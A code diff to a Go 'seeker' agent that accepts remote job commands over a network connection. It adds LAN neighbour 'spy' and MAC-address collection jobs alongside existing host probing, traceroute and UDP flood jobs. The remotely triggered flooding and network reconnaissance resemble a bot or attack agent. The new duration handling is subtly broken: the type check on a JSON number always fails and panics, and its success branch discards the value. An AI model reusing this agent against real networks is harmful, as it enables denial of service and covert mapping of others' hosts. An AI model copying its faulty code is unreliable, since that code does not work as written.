@@ -3,6 +3,7 @@ package seeker
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"net"
 	"runtime"
@@ -72,7 +73,9 @@ func Seeker() {
 				fallthrough
 			case "JOB HOSTUP":
 				fallthrough
-			case "JOB NEIGHBOURS":
+			case "JOB GETMAC":
+				fallthrough
+			case "JOB SPY":
 				fallthrough
 			case "JOB TRACERT":
 				fallthrough
@@ -80,11 +83,19 @@ func Seeker() {
 				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
 				fmt.Println("accept:", result)
 				break
+			default:
+				conn.Write([]byte("DENY JOB"))
+				continue
 			}
 			state = 2
 			continue
 		} else if state == 2 {
-			data := cleanedResult[len(queryStr)+1:]
+			var data string
+			if len(cleanedResult) > len(queryStr)+1 {
+				data = cleanedResult[len(queryStr)+1:]
+			} else {
+				data = ""
+			}
 			fmt.Println("[", data, "]")
 			switch queryStr {
 			case "JOB EQN":
@@ -122,7 +133,7 @@ func Seeker() {
 					online, offline, err := jobs.HostUp(host, &buf)
 					if err != nil {
 						if err.Error() != "timeout" {
-							conn.Write([]byte("JOB FAIL"))
+							conn.Write([]byte("JOB FAIL\r\n"))
 							break
 						}
 					}
@@ -139,13 +150,28 @@ func Seeker() {
 					break
 				}
 				break
-			case "JOB NEIGHBOURS":
-				val, err := strconv.Atoi(data)
+			case "JOB SPY":
+				var m map[string]interface{}
+				err := json.Unmarshal([]byte(data), &m)
 				if err != nil {
-					conn.Write([]byte("JOB FAIL"))
+					fmt.Println("ERROR: json parsing")
+					fmt.Println("data:", data)
+					conn.Write([]byte("JOB FAIL\r\n"))
+					break
 				}
-				ips, report := jobs.Neighbours(time.Duration(val) * time.Second)
-				conn.Write([]byte(fmt.Sprint(ips, "---", report)))
+				var dur int
+				if m["duration"] != nil {
+					var ok bool
+					dur, ok = m["duration"].(int)
+					if !ok {
+						panic(m["duration"])
+					} else {
+						dur = 5
+					}
+					m["duration"] = nil
+				}
+				sameLAN, report := jobs.Neighbours(m, time.Duration(dur)*time.Second)
+				conn.Write([]byte(fmt.Sprintln(sameLAN, "---", report)))
 				break
 			case "JOB UDPFLOOD":
 				// splits after JOB UDPFLOOD
@@ -173,6 +199,33 @@ func Seeker() {
 					}
 				}
 				break
+			case "JOB GETMAC":
+				fmt.Println("Data: [", data, "]")
+				if data == "SPYSEEKER" {
+					state = 0
+					continue
+				}
+				res, err := jobs.GetMACstr()
+				if err != nil {
+					fmt.Println(err)
+					conn.Write([]byte("JOB FAIL\r\n"))
+					break
+				}
+				buf, err := json.Marshal(res)
+				if err != nil {
+					fmt.Println(err)
+					conn.Write([]byte("JOB FAIL\r\n"))
+					break
+				}
+				conn.Write([]byte(fmt.Sprintln("JOB SUCC", string(buf))))
+				break
+			case "JOB SPYSEEKER":
+				state = 0
+				continue
+			default:
+				conn.Write([]byte("JOB FAIL\r\n"))
+				state = 0
+				continue
 			}
 			state = 1
 			continue
@@ -180,7 +233,8 @@ func Seeker() {
 	}
 }
 
-func main() {
+// Cmd is run in the cmd folders main.go
+func Cmd() {
 	i := 0
 	re := ""
 	for {
